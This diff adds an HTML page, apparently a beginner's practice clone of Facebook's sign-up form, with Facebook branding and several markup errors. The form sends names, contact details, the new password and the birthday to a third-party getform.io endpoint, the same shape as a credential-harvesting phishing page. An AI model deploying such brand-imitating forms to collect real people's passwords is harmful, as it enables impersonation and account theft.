@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head> 
+        <meta charset="UTF-8"> 
+        <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
+        <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+        <title>Facebook Form</title>
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha512-xh6O/CkQoPOWDdYTDqeRdPCVd1SpvCA9XXcUnZS2FmJNp1coAFzvtCN9BmamE+4aHK8yyUHUSCcJHgXloTyT2A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+        <link href="css/style.css" rel="stylesheet">
+    </head>
+    <body>
+
+        <img src="images/fb_logo.svg">
+        <section id="grid_container">
+            <main>
+                <form action="https://getform.io/f/ff7c07ab-98f2-444c-80ff-6c9e1918e6a7" method="POST">
+<!-- Heading-->
+                    <br>
+                    <h1 id="heading">Create a new account</h1>
+                    <p id="paragraph1">It's quick and easy.</p>
+                    <hr>
+<!-- Name Line -->
+                    <div id="first_name" class="text_input">
+                        <label for="first_name_id"></label>
+                        <input type="first_name"
+                        required
+                        minlength="2"
+                        maxlength="50"
+                        id="first_name_id" 
+                        name="first_name"
+                        placeholder="First name">
+
+                        <label for="last_name_id"></label>
+                        <input type="last_name"
+                        required
+                        minlength="2"
+                        maxlength="50"
+                        id="last_name_id" 
+                        name="last_name"
+                        placeholder="Last name">
+                    </div>
+
+<!-- Mobile Number Line -->
+
+                    <div id="mobile_email" class="text_input">
+                        <label for="mobile_email_id"></label>
+                        <input type="email"
+                        required
+                        minlength="5"
+                        maxlength="50"
+                        id="mobile_email_id" 
+                        name="mobile_email"
+                        placeholder="Mobile number or email">
+                    </div>
+
+<!-- Password Line -->
+
+                    <div id="password" class="text_input">
+                        <label for="password_id"></label>
+                        <input type="password"
+                        required
+                        minlength="6"
+                        maxlength="50"
+                        id="password_id" 
+                        name="password"
+                        placeholder="New password">
+                    </div>
+
+<!-- Birthday Line -->
+
+                    <div>
+                        <p id="paragraph2">Birthday<i class="fa-solid fa-question" style="color: #7a7a7a;"></i></p>
+                    </div>
+
+                    <div id="birthday">
+                        <select id="month_id" name="month" required>
+                            <option value="">Please Select..</option>
+                            <option value="january">January</option>
+                            <option value="February">February</option>
+                            <option value="march">March</option>
+                            <option value="april">April</option>
+                            <option value="may">May</option>
+                            <option value="june">June</option>
+                            <option value="july">July</option>
+                            <option value="august">August</option>
+                            <option value="september">September</option>
+                            <option value="october">October</option>
+                            <option value="november">November</option>
+                            <option value="december">December</option>
+                        </select>
+
+                        <select id="day_id" name="day" required>
+                            <option value="">Please Select..</option>
+                            <option value="first">1st</option>
+                            <option value="second">2nd</option>
+                            <option value="third">3rd</option>
+                            <option value="fourth">4th</option>
+                            <option value="fifth">5th</option>
+                            <option value="sixth">6th</option>
+                            <option value="seventh">7th</option>
+                            <option value="eigth">8th</option>
+                            <option value="ninth">9th</option>
+                            <option value="tenth">10th</option>
+                            <option value="eleventh">11th</option>
+                            <option value="twelfth">12th</option>
+                            <option value="thirteenth">13th</option>
+                            <option value="fourteenth">14th</option>
+                            <option value="fifteenth">15th</option>
+                            <option value="sixteenth">16th</option>
+                            <option value="seventeenth">17th</option>
+                            <option value="eighteenth">18th</option>
+                            <option value="nineteenth">19th</option>
+                            <option value="twentieth">20th</option>
+                            <option value="twentifirst">21st</option>
+                            <option value="twentisecond">22nd</option>
+                            <option value="twentithird">23rd</option>
+                            <option value="twentifourth">24th</option>
+                            <option value="twentififth">25th</option>
+                            <option value="twentisixth">26th</option>
+                            <option value="twentiseventh">27th</option>
+                            <option value="twentieigth">28th</option>
+                            <option value="twentininth">29th</option>
+                            <option value="thirtieth">30th</option>
+                            <option value="thirtifirst">31st</option>
+                        </select>
+
+                        <select id="year_id" name="year" required>
+                            <option value="">Please Select..</option>
+                            <option value="70">1970</option>
+                            <option value="71">1971</option>
+                            <option value="72">1972</option>
+                            <otion value="73">1973</otion>
+                            <option value="74">1974</option>
+                            <option value="75">1975</option>
+                            <option value="76">1976</option>
+                            <option value="77">1977</option>
+                            <option value="78">1978</option>
+                            <option value="79">1979</option>
+                            <option value="80">1980</option>
+                            <option value="81">1981</option>
+                            <option value="82">1982</option>
+                            <option value="83">1983</option>
+                            <option value="84">1984</option>
+                            <option value="85">1985</option>
+                            <option value="86">1986</option>
+                            <option value="87">1987</option>
+                            <option value="88">1988</option>
+                            <option value="89">1989</option>
+                            <option value="90">1990</option>
+                            <option value="91">1991</option>
+                            <option value="92">1992</option>
+                            <option value="93">1993</option>
+                            <option value="94">1994</option>
+                            <option value="95">1995</option>
+                            <option value="96">1996</option>
+                            <option value="97">1997</option>
+                            <option value="98">1998</option>
+                            <option value="99">1999</option>
+                            <option value="20">2000</option>
+                            <option value="01">2001</option>
+                            <option value="02">2002</option>
+                            <option value="03">2003</option>
+                            <option value="04">2004</option>
+                            <option value="05">2005</option>
+                        </select>
+                    </div>
+
+<!-- Gender -->
+
+                    <div>
+                        <p id="paragraph3">Gender<i class="fa-solid fa-question" style="color: #7a7a7a;"></i></p>
+                    </div>
+
+                    <div id="container">
+                    <div class="gender">
+                        <input type="radio" id="male_radio" name="male" value="male">
+                        <label for="male_radio">Male</label>
+                    </div>
+
+                    
+                    <div class="gender">
+                        <input type="radio" id="female_radio" name="female" value="female">
+                        <label for="female_radio">Female</label>
+                    </div>
+
+                    <div class="gender">
+                        <input type="radio" id="custom_radio" name="custom" value="custom">
+                        <label for="custom_radio">Custom</label>
+                    </div>
+                    </div>
+
+<!--Paragraph -->
+
+                    <p id="paragraph4">People who use our service may have uploaded your contact information to Facebook.
+                        <a href="#">Learn More.</a>
+                    </p>
+
+                    <p id="paragraph5">By clicking Sign Up, you agree to our
+                        <a href="#">Terms, Privacy Policy</a> and 
+                        <a href="#">Cookies Policy.</a>
+                        You may receive SMS Notifications fro us and can opt out at any time.
+                    </p>
+
+<!-- Button -->
+
+                    <input id="button" type="submit" value="Sign Up">
+
+<!-- Paragraph -->
+
+                    <p id="paragraph6"><a href="#">Already have an account?</a></p>
+                    <br>
+
+                </form>
+            </main>
+        </section>
+
+    </body>
+</html>
